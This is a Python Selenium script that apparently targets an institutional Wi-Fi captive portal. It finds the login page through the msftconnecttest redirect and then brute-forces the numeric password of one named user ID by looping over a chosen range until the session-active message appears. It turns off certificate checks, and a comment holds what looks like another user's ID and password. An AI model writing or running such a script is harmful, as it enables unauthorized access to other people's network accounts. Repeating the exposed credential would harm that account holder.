import requests
import time
from selenium import webdriver
import os
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

r1 = int(input('r1:'))
r2 = int(input('r2:'))


#initialsing stuff
url = 'http://www.msftconnecttest.com/redirect'
uid = '23JE0508'
chrome_options = Options()
chrome_options.add_argument("--enable-chrome-browser-cloud-management")
chrome_options.add_argument('--ignore-ssl-errors=yes')
chrome_options.add_argument('--ignore-certificate-errors')
os.environ['PATH'] += r"C:\seleniumDrivers"

#get the real url
data = requests.get(url)
current_url = str(data.content).split('"')[3]
print(current_url)

#set the driver
driver = webdriver.Chrome(options=chrome_options)


driver.get(current_url)

name_input = driver.find_element('name','username')
pwd_input = driver.find_element('name','password')
submit_btn = driver.find_element(By.CSS_SELECTOR,"input[type='submit']")
name_input.send_keys('kunal')
pwd_input.send_keys('1234')
submit_btn.click()

#82946350 23je0431
driver.implicitly_wait(3)

name_input = driver.find_element('name','username')
pwd_input = driver.find_element('name','password')
submit_btn = driver.find_element(By.CSS_SELECTOR,"input[type='submit']") 
name_input.send_keys('new')
pwd_input.send_keys('123')
submit_btn.click()


for i in range(r1,r2):
    time.sleep(0.2)
    name_input = driver.find_element('name','username')
    pwd_input = driver.find_element('name','password')
    submit_btn = driver.find_element(By.CSS_SELECTOR,"input[type='submit']")

    name_input.send_keys(uid)
    pwd_input.send_keys(str(i))
    submit_btn.click()

    print(f'current pwd:{i}')
    confirmation = driver.find_element(By.CSS_SELECTOR,'h2').text
    if confirmation=='This browser window is used to keep your authentication session active. Please leave it open in the background and open a new window to continue.':
        print(f'pwd found :{i}')
        break
    else:
        continue
    

#to exit 
input('enter to close..')





